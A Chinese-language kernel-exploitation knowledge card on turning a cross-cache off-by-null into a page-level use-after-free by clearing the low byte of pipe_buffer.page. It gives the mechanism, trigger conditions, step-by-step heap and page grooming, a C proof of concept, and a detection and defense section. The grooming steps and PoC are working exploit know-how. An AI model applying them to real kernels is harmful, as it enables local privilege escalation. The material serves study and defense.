---
id: binary-pwn-kernel-page-level-uaf-pipe-buffer-off-by-null
title: 跨缓存 off-by-null 命中 pipe_buffer.page 低字节：制造两管道同页的页级 UAF
type: scenario
domain: binary
path: binary/pwn/kernel
technique: page-level-uaf-pipe-buffer-page-pointer-partial-overwrite
tags:
- linux-kernel
- pipe-buffer
- off-by-null
- cross-cache
- page-level
- uaf
- heap-grooming
- exploit-primitive
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V168
  verified_at: '2026-11-06T10:10:21+08:00'
  notes: 已对照原文与截图核对：0x800对象2/页、obj末尾+1 NUL落到下一页首、pipe_buffer.page首字段、struct page 0x40步进/低字节清零、75%命中、F_SETPIPE_SZ 64槽=2048→kmalloc-cg-2k order-3、关闭orig造成页级UAF均一致；未验证点：未执行PoC。
url: /docs/binary/pwn/kernel/binary-pwn-kernel-page-level-uaf-pipe-buffer-off-by-null/
draft: false
kb_aliases:
- 页级 UAF
- page-level UAF
- pipe_buffer page 指针偏改写
- pipe_buffer 低字节清零
- cross-cache off-by-null
- 跨缓存 off-by-null
- 两管道同页
- F_SETPIPE_SZ 调整 pipe_buffer 大小
---

## 一句话结论

当漏洞对象大小恰为 0x800、每个 4KB slab page 正好放两个对象、且漏洞在对象末尾产生 1 字节 NUL 写时，越界字节会落到下一物理页的第 0 字节；用 buddy 页级风水把 `kmalloc-cg-2k` 的 `pipe_buffer` 数组页排到该页之后，这个 NUL 就清掉 `pipe_buffer[0].page` 的最低字节。`struct page` 在 vmemmap 中按 0x40 步进、页指针低字节对应 0x100 对齐的 4 个槽位，清零后 3/4 概率指向相邻页的 `struct page`，使两个管道引用同一物理页；关闭原管道即得到页级 UAF。

## 原理

- **对象与页的边界关系**：独立的 `kmem_cache` 若 `objsize=0x800`、slab page 为 4KB，则一页放两个对象：`obj0` 在 `[0x000,0x7ff]`、`obj1` 在 `[0x800,0xfff]`，`obj1` 的末尾正好贴着页末。漏洞 `buf_start[real_size] = 0` 在对象已有 8 字节数据、再追加 0x7f8 字节时，写入位置是 `ptr+0x800`——跨过 slab page 边界一字节，落到下一物理页的第 0 字节。
- **为什么下一字节是 pipe_buffer.page**：`pipe->bufs` 是 `kcalloc(nr_slots, sizeof(struct pipe_buffer), GFP_KERNEL_ACCOUNT)` 分配的一整块连续数组，不是逐个 `kmalloc`。`GFP_KERNEL_ACCOUNT` 使其进入 `kmalloc-cg-*` 记账 cache。数组开头就是 `pipe_buffer[0]`，其第一个字段是 `struct page *page`；所以只要 victim slab page 的首对象是 pipe_buffer 数组，NUL 就打在 page 指针上。
- **vmemmap 与 0x40 步进**：内核把每张物理页的元数据 `struct page` 排成大数组映射到 `vmemmap_base`：`page = vmemmap_base + (PA>>12)*sizeof(struct page)`，x86_64 上 `sizeof(struct page)=0x40`。虚拟地址的低字节因此只可能取 0x00/0x40/0x80/0xc0 四个值；把低字节清零，指针会落到 0x100 对齐的基址，即原指针或向前 1~3 个 `struct page`。这正是“偏改写”而非完全随机：目标仍是合法的 `struct page`，不会立刻崩。
- **75% 命中**：若原低字节本来就是 0x00（1/4 概率），清零指向自身，两个管道仍指向同一页但没有错位；若原低字节是 0x40/0x80/0xc0（3/4 概率），清零后指向物理地址更低的相邻页。管道数据页通常在循环中连续分配，相邻 PFN 的 struct page 恰好属于另一个管道，于是 victim 管道的 `page` 指向 orig 管道的数据页。
- **两管道同页 → 页级 UAF**：此时 victim 和 orig 两个管道的 `pipe_buffer[0].page` 指向同一张物理页，读 victim 会读到 orig 写入的标记。关闭 orig 管道会把该物理页释放回 buddy，而 victim 的 pipe_buffer 仍保存这个 `struct page` 指针，形成对已释放物理页的引用——页级 UAF。之后可把该页重分配为其它 pipe_buffer 数组或其它页级对象。
- **F_SETPIPE_SZ 控制数组大小/所属桶**：`pipe_fcntl()` 的 `F_SETPIPE_SZ` → `pipe_set_size()` → `pipe_resize_ring()`，执行 `bufs = kcalloc(nr_slots, sizeof(*bufs), GFP_KERNEL_ACCOUNT | __GFP_NOWARN)`。`nr_slots` 由传入的字节数按页大小换算；把 `nr_slots * sizeof(struct pipe_buffer)` 调到 (1024,2048] 就从 `kmalloc-cg-2k` 分配。原文目标内核中 `sizeof(struct pipe_buffer)=32`，64 槽位正好 2048 字节；而 `kmalloc-cg-2k` 的 slab page 为 order-3（32KB，16 个 2KB 对象），与 0x800 对象的 vuln cache 同为 order-3，页级风水才能对齐。
- **为什么不是普通的同 cache UAF**：漏洞在独立 cache 中，free 对象后 freelist 保护（freelist pointer 混淆、double-free 检查）会让“直接改 freelist”不可行；跨缓存溢出改的是另一个 cache 的 slab page，不经过 vuln cache 的 freelist，因此不受这些保护影响。

## 触发条件

- 存在独立 `kmem_cache`（无构造器、对象 0x800），漏洞可在对象末尾写 1 字节 NUL，且对象排列使第二个对象末尾贴页末。
- 同一 cache 的 slab page 为 order-3（或与 `pipe_buffer` 数组所在 `kmalloc-cg-2k` 的 slab order 相同）；`CONFIG_MEMCG_KMEM` 开启时 pipe 数组走 `kmalloc-cg-*`，否则可能落到普通 `kmalloc-*`，需按目标配置确认。
- 进程可创建大量 pipe，且 `fcntl(F_SETPIPE_SZ)` 不被 `fs.pipe-max-size`/RLIMIT 限制（数组大小要能落到 2KB 桶）。
- 能通过 PF_PACKET TX_RING 等页分配 API 做页级排布，使 victim 数组页紧邻 vuln slab page；允许 75% 概率失败后重试。
- 页大小 4KB；`struct pipe_buffer` 的 `page` 必须是首字段（主流内核均如此），大小按版本核对。

## 利用步骤

1. **准备页喷子系统**：建立 PF_PACKET TX_RING 的父/子进程命令通道（详见 [[binary-pwn-kernel-buddy-page-spray-packet-tx-ring]]），子进程在 unprivileged user+net namespace 内分配/释放 order-0/2/3 页。
2. **创建管道并调整数组大小**：创建约 200 个 pipe；对前一半调用 `fcntl(fd[1], F_SETPIPE_SZ, 0x1000*64)`，使每根管道的 `pipe->bufs` 为 64 槽位 × 32 字节 = 2048 字节，进入 `kmalloc-cg-2k`。
3. **占住 vuln slab page**：`free_page()` 释放一个 order-3（0x8000 字节）的 pgv 块，立即在漏洞 cache 上分配 16 个 0x800 对象（如 `ioctl(ALLOC)` 循环），让这个 32KB 块成为 vuln cache 的 slab page。
4. **让 victim 数组页贴上来**：对剩余一半 pipe 执行同样的 `F_SETPIPE_SZ`，它们的 2KB 数组从 `kmalloc-cg-2k` 申请 order-3 slab page，会优先复用刚释放/相邻的 order-3 块，从而落在 vuln slab page 的前后。
5. **建立可检测的管道内容**：向每个管道写入识别数据（如 8 字节 magic + 本管道索引，再补若干字节保证 pipe_buffer 不被 release）。这会为每个管道分配数据页，使 `pipe_buffer[0].page` 指向各自的数据页；相邻数据页的 PFN 通常连续，是“低字节清零后撞到别的管道页”的前提。
6. **触发跨缓存 NUL 写**：对 16 个 vuln 对象逐个 `ioctl(APPEND, size=0x800-8)`（对象已有 8 字节长度），使 `ptr[0x800]=0` 打到下一页首字节。
7. **识别被改写的管道**：逐个 `read(pipe_fd[i][0], magic, 8)` 并读取后面的索引；若 magic 正确但索引 `nr != i`，说明 pipe i 的 page 指针已指向 pipe nr 的数据页，记录 `victim=i, orig=nr`。
8. **制造页级 UAF**：`close()` orig 管道的读写端，将其数据页归还 buddy；victim 管道的 `pipe_buffer[0].page` 仍指向该页。此时读 victim 可继续访问已释放页，进入下一阶段（重分配为 pipe_buffer 数组等）。

## PoC

```c
#define PIPE_SPRAY_NUM 200
#define KCACHE_SIZE    0x800
#define KCACHE_NUM     0x10

static int pipe_fd[PIPE_SPRAY_NUM][2];

/* 1) 把前一半 pipe 的 bufs 数组调到 kmalloc-cg-2k：
 *    64 slots * sizeof(struct pipe_buffer)=64*32=2048 */
static int extend_pipe_buffer_to_2k(int start, int nr) {
    for (int i = 0; i < nr; i++) {
        if (i % 8 == 0) free_page(pgv_8pages_start_idx++);   /* 让出 order-3 页 */
        if (fcntl(pipe_fd[start + i][1], F_SETPIPE_SZ, 0x1000 * 64) < 0)
            return -1;
    }
    return 0;
}

/* 2) 布局：victim 数组页 - vuln slab page - victim 数组页 */
extend_pipe_buffer_to_2k(0, PIPE_SPRAY_NUM / 2);

free_page(pgv_8pages_start_idx++);                 /* 空出 order-3 块 */
for (int i = 0; i < KCACHE_NUM; i++)
    kcache_alloc(i, 8, "marker");                   /* 16 * 0x800 = 32KB */

extend_pipe_buffer_to_2k(PIPE_SPRAY_NUM / 2, PIPE_SPRAY_NUM / 2);

/* 3) 每个管道写入 magic + 索引，分配数据页并留下 pipe_buffer[0] */
for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
    write(pipe_fd[i][1], "marker", 8);
    write(pipe_fd[i][1], &i, sizeof(int));
    write(pipe_fd[i][1], &i, sizeof(int));
    write(pipe_fd[i][1], &i, sizeof(int));
}

/* 4) 触发对象末尾 off-by-null（写入 ptr+0x800） */
for (int i = 0; i < KCACHE_NUM; i++)
    kcache_append(i, KCACHE_SIZE - 8, buf);         /* 已有 8 字节，追加 0x7f8 */

/* 5) 找出 page 被指向别的管道的 victim */
for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
    char magic[8]; int nr;
    read(pipe_fd[i][0], magic, 8);
    read(pipe_fd[i][0], &nr, sizeof(int));
    if (!strcmp(magic, "marker") && nr != i) {
        orig_pid = nr; victim_pid = i;              /* victim 指向 orig 的页 */
        break;
    }
}
if (victim_pid == -1) err_exit("未命中，重试布局");

/* 6) 关闭 orig -> 页级 UAF */
close(pipe_fd[orig_pid][0]);
close(pipe_fd[orig_pid][1]);
```

原文以 `sizeof(struct pipe_buffer)=32` 的目标内核完成利用；若目标内核结构体为 40 字节（含 `private` 字段），64 槽位是 2560 字节，会落到 `kmalloc-cg-4k`，需要重新选择槽位数或改用 4k 桶对应的 slab order。本卡不执行 PoC。

## 变体与关联

- **25% 自指分支**：低字节原为 0x00 时 page 指针不变，可利用管道读取判断后直接重试；也可通过多次布局直到出现 `nr != i`。
- **不同对象大小/页大小**：若页大小 16KB 或对象大小不同，只要对象末尾贴页末且下一页首字段是指针，同样可做；关键是 `off-by-one` 落在下一个 slab page 的起始对象上。
- **不同 victim 对象**：首字段为指针且低字节清零后能指向有用对象的 slab 对象都可替代 `pipe_buffer`；pipe_buffer 的优势是首字段为 `struct page *`、且管道本身提供可观测的读写原语。
- **非 NUL 的跨缓存写**：若漏洞能写更多字节，可直接覆写整个 page 指针或 `ops`，不必依赖 75% 概率；但 `CONFIG_CFI_CLANG` 下劫持 ops 受限，改数据指针（如 page）更稳。
- **关联**：[[binary-pwn-kernel-buddy-page-spray-packet-tx-ring]]（页级风水）、[[binary-pwn-kernel-self-writing-pipe-arbitrary-rw]]（拿到页级 UAF 后的升级）、[[binary-pwn-kernel-dirty-pagetable-pmd-pte-overlap-physical-rw]]（另一种页级复用思路）。
- **边界**：本卡只到“页级 UAF/两管道同页”，还不是任意读写；要达到提权需要后续把该页重分配为可控的 pipe_buffer 数组并建立自写管道。成功率受布局、slub order、`CONFIG_MEMCG_KMEM` 与 pipe 大小限制影响。

## 检测与防御

- **修漏洞**：消除末尾一字节写（边界检查、canary/redzone）；`CONFIG_SLAB_FREELIST_HARDENED`、`CONFIG_SLAB_FREELIST_RANDOM` 对跨缓存写无效，不能替代修复。
- **调试检测**：KASAN/KFENCE 能在越界写或页 UAF 处报告；`CONFIG_DEBUG_VM`、slub debug 可发现对象越界；测试环境应开启。
- **限制 pipe 原语**：降低 `fs.pipe-max-size`，用 RLIMIT 限制单进程 pipe 总容量，使 `F_SETPIPE_SZ` 难以把数组调到目标 kmalloc 桶；限制进程可创建的 pipe 数量。
- **页级隔离**：将敏感对象放入不与用户可调 pipe 数组共享 slab order/页分配器的 cache，或启用内核的页级隔离/调试特性，可降低跨缓存命中；但根本仍是消除越界。
- **检测**：进程在短时间内创建大量 pipe 并反复 `F_SETPIPE_SZ`；管道读取返回另一个管道的数据（跨管道页共享）；关闭管道后仍出现对该物理页的访问导致 KASAN 报告或崩溃。
